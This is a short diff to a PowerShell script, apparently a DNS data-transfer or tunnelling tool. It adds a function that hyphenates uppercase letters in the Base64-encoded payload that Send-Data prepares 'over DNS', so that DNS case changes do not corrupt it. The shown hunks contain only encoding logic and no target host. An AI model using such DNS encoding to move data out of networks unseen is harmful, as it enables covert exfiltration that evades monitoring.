@@ -1,3 +1,20 @@
+function AppendHyphenToUppercaseLetters() {
+    param (
+        [string]$inputString
+    )
+    $outputString = ""
+
+    foreach ($character in $inputString.ToCharArray()) {
+        if ([char]::IsUpper($character)) {
+            $outputString += "-" + $character
+        } else {
+            $outputString += $character
+        }
+    }
+
+    return $outputString
+}
+
 function Send-Data {
     param (
         $data,
@@ -18,7 +35,11 @@ function Send-Data {
     
     # Encode data as Base64
     $encodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($json))
-    
+
+    # This step is neccessary, because some DNS servers change the case of the letters randomly, so it doens't get cached
+    # Add hyphen in front of every upper case letter
+    $encodedData = AppendHyphenToUppercaseLetters $encodedData 
+
     # Replace padding characters with _ so it can be transmitted over DNS
     $encodedData = $encodedData.Replace("=", "_")
     
